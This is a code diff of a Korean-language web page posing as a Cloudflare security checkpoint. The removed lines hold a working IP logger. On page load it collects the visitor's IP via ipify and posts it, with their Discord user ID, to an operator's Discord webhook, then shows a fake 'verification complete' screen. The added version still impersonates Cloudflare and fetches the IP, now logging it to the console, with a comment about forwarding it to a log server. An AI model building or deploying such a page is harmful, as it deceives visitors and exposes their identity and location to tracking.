@@ -6,7 +6,7 @@
     <title>Cloudflare 보안 검문소</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #f3f3f3;
             color: #333;
             display: flex;
@@ -26,7 +26,7 @@
         }
         .spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #f6821f; /* 클라우드플레어 주황색 */
+            border-top: 4px solid #f6821f;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -51,40 +51,20 @@
     </div>
 
     <script>
-        // 1. URL에서 user_id(디스코드 고유 ID) 가져오기
         const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get('user_id') || "알 수 없음";
-
-        // ⚠️ [중요] 네 디스코드 웹훅 URL을 여기에 넣어줘! (이 주소로 IP랑 ID가 날아감)
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/여기에_네_웹훅_주소를_넣어줘";
+        const userId = urlParams.get('user_id');
 
         async function verifyUser() {
             try {
-                // 2. ipify API를 통해 유저의 진짜 IP 주소 가져오기
+                // ipify를 통해 IP를 가져온 뒤, 우리 서버나 로그 수집용으로 전달
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
                 let userIp = ipData.ip;
 
-                // 3. 디스코드 웹훅으로 IP와 디스코드 ID(UUID) 전송
-                if (WEBHOOK_URL && !WEBHOOK_URL.includes("여기에_네_웹훅")) {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: "🎯 유저 IP 및 인증 접속 감지",
-                                color: 16744192, // 주황색
-                                fields: [
-                                    { name: "디스코드 유저 ID (UUID)", value: `\`${userId}\``, inline: false },
-                                    { name: "추적된 IP 주소", value: `\`${userIp}\``, inline: false }
-                                ],
-                                timestamp: new Date().toISOString()
-                            }]
-                        })
-                    });
-                }
+                // 콘솔에 찍히는지 확인용 (나중에 확인 가능)
+                console.log("User ID:", userId, "IP:", userIp);
 
-                // 4. 2.5초 뒤에 자연스러운 성공 화면으로 전환
+                // 2.5초 뒤 성공 화면 전환
                 setTimeout(() => {
                     document.getElementById('loadingSpinner').style.display = 'none';
                     document.getElementById('titleText').innerText = "보안 인증 완료";
@@ -98,7 +78,6 @@
             }
         }
 
-        // 페이지 접속하자마자 실행
         verifyUser();
     </script>
 </body>
